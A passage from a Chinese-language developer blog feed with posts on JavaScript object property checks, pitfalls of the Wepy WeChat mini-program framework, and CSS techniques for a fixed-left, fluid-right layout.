<p>最近在读《JavaScript Enlightenment》（JavaScript启示录）</p>
</blockquote>
<a id="more"></a>
<h2 id="使用delete删除一个属性"><a href="#使用delete删除一个属性" class="headerlink" title="使用delete删除一个属性"></a>使用delete删除一个属性</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    age:<span class="number">00</span>,</span><br><span class="line">    gender:<span class="string">'male'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span> a.age;</span><br></pre></td></tr></table></figure>
<p>delete是将对象属性删除的唯一的方法，将对象属性设为undefined或null只会改变属性的值，并不会删除。</p>
<h2 id="使用in操作符检查一个对象是否包含给定属性"><a href="#使用in操作符检查一个对象是否包含给定属性" class="headerlink" title="使用in操作符检查一个对象是否包含给定属性"></a>使用in操作符检查一个对象是否包含给定属性</h2><p>根据原型链的概念，即使一个空对象，其内部属性也继承了Object.prototype的属性。<strong>Object.prototype是原型链的最顶级。</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> test0 = &#123;<span class="attr">name</span>:<span class="string">'tom'</span>&#125;;</span><br><span class="line"><span class="comment">//这里的name要加引号</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'name'</span> <span class="keyword">in</span> test0);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'toString'</span> <span class="keyword">in</span> test0);<span class="comment">//输出true,继承了原型链上的Object.prototype的属性</span></span><br></pre></td></tr></table></figure>
<h2 id="使用hasOwnProperty-检查对象属性是否来自原型链"><a href="#使用hasOwnProperty-检查对象属性是否来自原型链" class="headerlink" title="使用hasOwnProperty()检查对象属性是否来自原型链"></a>使用hasOwnProperty()检查对象属性是否来自原型链</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> test1 = &#123;<span class="attr">name</span>:<span class="string">'jack'</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test1.hasOwnProperty(<span class="string">'name'</span>));<span class="comment">//输出true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'toString'</span> <span class="keyword">in</span> test1);<span class="comment">//输出true,原型链上的Object.prototype的属性</span></span><br><span class="line"><span class="built_in">console</span>.log(test1.hasOwnProperty(<span class="string">'toString'</span>));<span class="comment">//输出false</span></span><br></pre></td></tr></table></figure>
<h2 id="使用for-in和hasOwnProperty-循环枚举对象的属性"><a href="#使用for-in和hasOwnProperty-循环枚举对象的属性" class="headerlink" title="使用for-in和hasOwnProperty()循环枚举对象的属性"></a>使用for-in和hasOwnProperty()循环枚举对象的属性</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> test2 = &#123;</span><br><span class="line">    age:<span class="number">00</span>,</span><br><span class="line">    gender:<span class="string">'male'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> test2)&#123;</span><br><span class="line">    <span class="comment">//使用hasOwnProperty()判断是否是来自原型链的属性</span></span><br><span class="line">    <span class="keyword">if</span>(test2.hasOwnProperty(key))&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(key);<span class="comment">//属性</span></span><br><span class="line">        <span class="built_in">console</span>.log(test2[key]);<span class="comment">//属性的值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>for-in循环有一个缺点，他不仅会遍历特定对象的本地属性，还会遍历其继承的对象上的属性</p>
</li>
<li><p>循环访问的属性并不是其被定义的顺序</p>
</li>
</ul>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>js启示录</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序框架Wepy的一些坑</title>
    <url>/2019/04/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6Wepy%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91.html</url>
    <content><![CDATA[<p>相较于原生将js、wxss、wxml、json配置分开，wepy采用单文件模式，很贴近vue语法，对es6、css预处理器等的支持效率提升很多，但是坑也是有很多，记录下避免重复踩坑浪费时间。</p>
<a id="more"></a>
<h3 id="页面实例与组件实例继承要对应"><a href="#页面实例与组件实例继承要对应" class="headerlink" title="页面实例与组件实例继承要对应"></a>页面实例与组件实例继承要对应</h3><p>在写组件时把组件写成继承自wepy.page，导致组件无法渲染</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面继承自wepy.page</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">page</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件继承自wepy.component</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Card</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">component</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>Page页面实际上继承自Component组件，即Page也是组件。除扩展了页面所特有的config配置以及特有的页面生命周期函数之外，其它属性和方法与Component一致，但声明继承不能错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wepy <span class="keyword">from</span> <span class="string">'wepy'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPage</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">page</span> </span>&#123;</span><br><span class="line"><span class="comment">// export default class MyComponent extends wepy.component &#123;</span></span><br><span class="line"></span><br><span class="line">    config = &#123;&#125;;  <span class="comment">// 只在Page实例中存在的配置数据，对应于原生的page.json文件</span></span><br><span class="line"></span><br><span class="line">    customData = &#123;&#125;  <span class="comment">// 自定义数据</span></span><br><span class="line"></span><br><span class="line">    data = &#123;&#125;;  <span class="comment">// 页面所需数据均需在这里声明，可用于模板数据绑定</span></span><br><span class="line"></span><br><span class="line">    components = &#123;&#125;;  <span class="comment">// 声明页面中所引用的组件，或声明组件中所引用的子组件</span></span><br><span class="line"></span><br><span class="line">    mixins = [];  <span class="comment">// 声明页面所引用的Mixin实例</span></span><br><span class="line"></span><br><span class="line">    computed = &#123;&#125;;  <span class="comment">// 声明计算属性（详见后文介绍）</span></span><br><span class="line"></span><br><span class="line">    watch = &#123;&#125;;  <span class="comment">// 声明数据watcher（详见后文介绍）</span></span><br><span class="line"></span><br><span class="line">    methods = &#123;&#125;;  <span class="comment">// 声明页面wxml中标签的事件处理函数。注意，此处只用于声明页面wxml中标签的bind、catch事件，自定义方法需以自定义方法的方式声明</span></span><br><span class="line"></span><br><span class="line">    events = &#123;&#125;;  <span class="comment">// 声明组件之间的事件处理函数</span></span><br><span class="line"></span><br><span class="line">    customFunction ()　&#123;&#125;  <span class="comment">//自定义方法</span></span><br><span class="line"></span><br><span class="line">    onLoad () &#123;&#125;  <span class="comment">// 在Page和Component共用的生命周期函数</span></span><br><span class="line"></span><br><span class="line">    onShow () &#123;&#125;  <span class="comment">// 只在Page中存在的页面生命周期函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="props静态与动态传值"><a href="#props静态与动态传值" class="headerlink" title="props静态与动态传值"></a>props静态与动态传值</h3><p>静态传值为父组件向子组件传递<strong>常量数据</strong>，因此只能传递<strong>String字符串类型</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">child</span> <span class="attr">title</span>=<span class="string">"mytitle"</span>&gt;</span><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>动态传值像Vue，但是传的数据需要是在父组件声明过或者引用类型，<strong>不能直接传Boolean、Number等基础类型</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 正确：</span><br><span class="line"><span class="tag">&lt;<span class="name">child</span> <span class="attr">:title</span>=<span class="string">"parentTitle"</span> <span class="attr">:syncTitle.sync</span>=<span class="string">"parentTitle"</span> <span class="attr">:twoWayTitle.sync</span>=<span class="string">"parentTitle"</span>&gt;</span><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    parentTitle: 'p-title'</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// child.wpy</span><br><span class="line"></span><br><span class="line">props = &#123;</span><br><span class="line">    // 静态传值</span><br><span class="line">    title: String,</span><br><span class="line"></span><br><span class="line">    // 父向子单向动态传值</span><br><span class="line">    syncTitle: &#123;</span><br><span class="line">        type: String,</span><br><span class="line">        default: 'null'</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    twoWayTitle: &#123;</span><br><span class="line">        type: String,</span><br><span class="line">        default: 'nothing',</span><br><span class="line">        twoWay: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 错误 不能动态传值传基础类型，必须声明</span><br><span class="line"><span class="tag">&lt;<span class="name">child</span> <span class="attr">:myNumber</span>=<span class="string">"12"</span> <span class="attr">:myNumber1.sync</span>=<span class="string">"12"</span> <span class="attr">:isTrue</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="同一页面重复引用同一组件相关问题"><a href="#同一页面重复引用同一组件相关问题" class="headerlink" title="同一页面重复引用同一组件相关问题"></a>同一页面重复引用同一组件相关问题</h3><h4 id="循环渲染使用"><a href="#循环渲染使用" class="headerlink" title="循环渲染使用"></a>循环渲染使用<repeat></repeat></h4><p>循环渲染组件时必须使用<strong>wepy特有的辅助标签<code>&lt;repeat&gt;</code></strong>，而不是使用原生的<code>wx:for</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repeat</span> <span class="attr">for</span>=<span class="string">"&#123;&#123;list&#125;&#125;"</span> <span class="attr">key</span>=<span class="string">"index"</span> <span class="attr">index</span>=<span class="string">"index"</span> <span class="attr">item</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 插入&lt;script&gt;脚本部分所声明的child组件，同时传入item --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">child</span> <span class="attr">:item</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repeat</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> wepy <span class="keyword">from</span> <span class="string">'wepy'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./child'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">page</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 声明组件ID为child</span></span></span><br><span class="line">        components = &#123;</span><br><span class="line">            child: Child</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line"><span class="javascript">            list: [&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">title</span>: <span class="string">'title1'</span>&#125;, &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">title</span>: <span class="string">'title2'</span>&#125;]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="重复引用需为每个组件声明ID"><a href="#重复引用需为每个组件声明ID" class="headerlink" title="重复引用需为每个组件声明ID"></a>重复引用需为每个组件声明ID</h4><p>Wepy中的组件都是静态组件，是<strong>以组件ID作为唯一标识</strong>的，每一个ID都对应一个组件实例。<br>当页面引入两个相同ID的组件时，这<strong>两个组件共用同一个实例与数据</strong>，当其中一个组件数据变化时，<strong>另外一个也会一起变化</strong>。</p>
<p>这也是不同于vue的地方，当同一页面使用同一组件较多次时，这就很难受了。</p>
<p>如果需要避免这个问题，必须<strong>需要分配多个组件ID和实例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"child1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form-item1</span>&gt;</span><span class="tag">&lt;/<span class="name">form-item1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form-item2</span>&gt;</span><span class="tag">&lt;/<span class="name">form-item2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> wepy <span class="keyword">from</span> <span class="string">'wepy'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> FormItem <span class="keyword">from</span> <span class="string">'./formItem'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">page</span> </span>&#123;</span></span><br><span class="line">        components = &#123;</span><br><span class="line"><span class="javascript">            <span class="comment">//为两个相同组件的不同实例分配不同的组件ID，从而避免数据同步变化的问题</span></span></span><br><span class="line"><span class="javascript">            <span class="string">"form-item1"</span>: FormItem,</span></span><br><span class="line"><span class="javascript">            <span class="string">"form-item2"</span>: FormItem</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="组件内动态绑定class，且类名含”-“时，渲染会自动加上ID"><a href="#组件内动态绑定class，且类名含”-“时，渲染会自动加上ID" class="headerlink" title="组件内动态绑定class，且类名含”-“时，渲染会自动加上ID"></a>组件内动态绑定class，且类名含”-“时，渲染会自动加上ID</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// index.wpy</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form-item1</span> <span class="attr">:isActive.sync</span>=<span class="string">"isActive"</span>&gt;</span><span class="tag">&lt;/<span class="name">form-item1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form-item2</span>&gt;</span><span class="tag">&lt;/<span class="name">form-item2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> wepy <span class="keyword">from</span> <span class="string">'wepy'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> FormItem <span class="keyword">from</span> <span class="string">'./formItem'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">page</span> </span>&#123;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line"><span class="javascript">            isActive: <span class="literal">true</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        components = &#123;</span><br><span class="line"><span class="javascript">            <span class="comment">//为两个相同组件的不同实例分配不同的组件ID，从而避免数据同步变化的问题</span></span></span><br><span class="line"><span class="javascript">            <span class="string">"form-item1"</span>: FormItem,</span></span><br><span class="line"><span class="javascript">            <span class="string">"form-item2"</span>: FormItem</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// formItem.wpy</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">:class</span>=<span class="string">"&#123;'vk-activity': isActive&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> wepy <span class="keyword">from</span> <span class="string">'wepy'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">component</span> </span>&#123;</span></span><br><span class="line"></span><br><span class="line">        props = &#123;</span><br><span class="line">            isActive: &#123;</span><br><span class="line"><span class="javascript">                type: <span class="built_in">Boolean</span>，</span></span><br><span class="line"><span class="javascript">                <span class="keyword">default</span>: <span class="literal">false</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终index.wpy会被渲染成wxml：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"vk- formItem1 activity"</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>解决方法是不用<strong>横杠的类名，改用驼峰或单个单词等。</strong></p>
<h3 id="改组件名后，wepy报组件找不到错"><a href="#改组件名后，wepy报组件找不到错" class="headerlink" title="改组件名后，wepy报组件找不到错"></a>改组件名后，wepy报组件找不到错</h3><p>改动组件名时<strong>wepy有时不会立即生成wxml</strong>，这时候看dist生成的wxml是没有文件或者文件不对，可<strong>删除dist中的对应wxml文件</strong>，手动触发wpy文件改动就可以了。</p>
<h3 id="组件中引用组件时，最底层组件变动有时不会触发上层或上几层页面的热加载"><a href="#组件中引用组件时，最底层组件变动有时不会触发上层或上几层页面的热加载" class="headerlink" title="组件中引用组件时，最底层组件变动有时不会触发上层或上几层页面的热加载"></a>组件中引用组件时，最底层组件变动有时不会触发上层或上几层页面的热加载</h3><p>不触发热加载很坑，应该是嵌套多层的原因，ctrl+c再run dev重新跑项目，不行就删了dist中的组件再重新编译。</p>
<h3 id="异步函数中更新数据，必须手动调用-apply-，才会触发脏数据检查"><a href="#异步函数中更新数据，必须手动调用-apply-，才会触发脏数据检查" class="headerlink" title="异步函数中更新数据，必须手动调用$apply()，才会触发脏数据检查"></a>异步函数中更新数据，必须手动调用$apply()，才会触发脏数据检查</h3><h3 id="wepy对原生API进行了promise处理，但也有一些问题"><a href="#wepy对原生API进行了promise处理，但也有一些问题" class="headerlink" title="wepy对原生API进行了promise处理，但也有一些问题"></a>wepy对原生API进行了promise处理，但也有一些问题</h3><p>在原生API中往往是采用回调的形式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.showModal(&#123;</span><br><span class="line">    title: <span class="string">"提示"</span>,</span><br><span class="line">    content: <span class="string">"这是一个模态弹窗"</span>,</span><br><span class="line">    success(res) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.confirm) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"用户点击确定"</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.cancel) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log<span class="string">"用户点击取消"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>在wepy中，配合polyfill可以使用<code>async await</code>处理异步函数；</p>
<p>在<code>app.wpy</code>入口文件中声明:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">wepy</span>.<span class="title">app</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.use(<span class="string">"requestfix"</span>);</span><br><span class="line">        <span class="comment">// 声明使用promisify</span></span><br><span class="line">        <span class="keyword">this</span>.use(<span class="string">"promisify"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就可以使用<code>await async</code>了：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> handleXx() &#123;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> wepy.showModal();</span><br><span class="line">    <span class="keyword">if</span> (res.confirm) <span class="built_in">console</span>.log(<span class="string">"用户点击确定"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是部分API还是有问题的，如<a href="https://developers.weixin.qq.com/miniprogram/dev/api/wx.getUpdateManager.html" target="_blank" rel="noopener">getUpdateManager()</a>；</p>
<p><code>wepy.getUpdateManager()</code>会返回一个promise,但无resolved，不是updateManager对象。</p>
<p>为此我在wepy github仓库提了一个<a href="https://github.com/Tencent/wepy/issues/2102" target="_blank" rel="noopener">issue</a>，但是没有维护人员的回复，感觉wepy没人维护了…</p>
<p>解决方法是使用原生方法<code>wx.getUpdateManager()</code></p>
<h3 id="预先在data中声明值"><a href="#预先在data中声明值" class="headerlink" title="预先在data中声明值"></a>预先在data中声明值</h3><p>在dom上使用值做判断时，该值一定要在data里先声明，否则值改变时，dom不会变化</p>
]]></content>
      <categories>
        <category>Miniprogram</category>
      </categories>
  </entry>
  <entry>
    <title>左侧定宽，右侧自适应与双飞翼布局</title>
    <url>/2017/11/%E5%B7%A6%E4%BE%A7%E5%AE%9A%E5%AE%BD%EF%BC%8C%E5%8F%B3%E4%BE%A7%E8%87%AA%E9%80%82%E5%BA%94%E4%B8%8E%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80.html</url>
    <content><![CDATA[<p><img src="http://static.simmzl.cn/blog/171120/llKIk0Fmj2.png?imageslim" alt="mark"><br><a id="more"></a></p>
<h1 id="左侧定宽，右侧自适应布局："><a href="#左侧定宽，右侧自适应布局：" class="headerlink" title="左侧定宽，右侧自适应布局："></a>左侧定宽，右侧自适应布局：</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#4FB3A4</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#e07d075c</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="flex-布局"><a href="#flex-布局" class="headerlink" title="flex 布局"></a>flex 布局</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">flex: none | [ &lt;'flex-grow'&gt; &lt;'flex-shrink'&gt; &lt;'flex-basis'&gt; ]</span><br></pre></td></tr></table></figure>
<p>默认 0 1 auto</p>
<ul>
<li>flex-grow：定义项目的放大比例，默认为0</li>
<li>flex-shrink：定义了项目的缩小比例，默认为1</li>
<li>flex-basis：定义了在分配多余空间之前，项目占据的主轴空间（main size）</li>
</ul>
<h2 id="左侧浮动，右侧width-100"><a href="#左侧浮动，右侧width-100" class="headerlink" title="左侧浮动，右侧width:100%"></a>左侧浮动，右侧width:100%</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="左侧绝对定位，右侧设置margin-left"><a href="#左侧绝对定位，右侧设置margin-left" class="headerlink" title="左侧绝对定位，右侧设置margin-left"></a>左侧绝对定位，右侧设置margin-left</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="两侧都是绝对定位"><a href="#两侧都是绝对定位" class="headerlink" title="两侧都是绝对定位"></a>两侧都是绝对定位</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="两侧都左浮动，右侧设置calc宽度"><a href="#两侧都左浮动，右侧设置calc宽度" class="headerlink" title="两侧都左浮动，右侧设置calc宽度"></a>两侧都左浮动，右侧设置calc宽度</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">200px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="负margin"><a href="#负margin" class="headerlink" title="负margin"></a>负margin</h2><p>首先需要把右侧自适应部分用容器包起来并放在前面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
